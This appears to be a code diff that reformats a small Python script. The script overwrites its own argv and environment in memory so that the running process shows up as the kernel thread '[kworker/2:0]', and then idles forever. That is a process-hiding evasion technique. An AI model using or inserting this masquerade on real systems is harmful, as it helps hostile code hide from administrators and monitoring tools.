@@ -1,16 +1,15 @@
 #!/usr/bin/env python
-# -*- coding: UTF8 -*-
+# -*- coding: utf-8 -*-
 # Modifications: Nicolas VERDIER (contact@n1nj4.eu)
 # Original author is unknown
 # source : I received the original version of this code from a private message on reddit
 import ctypes
 import os
-import sys
 
 class Stat():
     def add(self, pid, comm, state, ppid, pgrp, session, tty_nr, tpgid, flags, minflt, cminflt, majflt, cmajflt, utime, stime, cutime, cstime, priority, nice, num_threads, itrealvalue, starttime, vsize, rss, rsslim, startcode, endcode, startstack, kstkesp, kstkeip, signal, blocked, sigignore, sigcatch, wchan, nswap, cnswap, exit_signal, processor, rt_priority, policy, delayacct_blkio_ticks, guest_time, cguest_time, start_data, end_data, start_brk, arg_start, arg_end, env_start, env_end, exit_code):
-	self.argv  = (int(arg_start), int(arg_end))
-	self.env = (int(env_start), int(env_end))
+        self.argv  = (int(arg_start), int(arg_end))
+        self.env = (int(env_start), int(env_end))
 
 
 def parse_proc_stat():
@@ -43,9 +42,8 @@ def change_argv(argv="/bin/bash", env=""):
         memcpy(info.env, env) #clean environ
 
 if __name__=="__main__":
-	print "pid: %s"%os.getpid()
-	change_argv(argv="[kworker/2:0]")
-	import time
-	while True:
-		time.sleep(1)
-	
+    print "pid: %s"%os.getpid()
+    change_argv(argv="[kworker/2:0]")
+    import time
+    while True:
+        time.sleep(1)
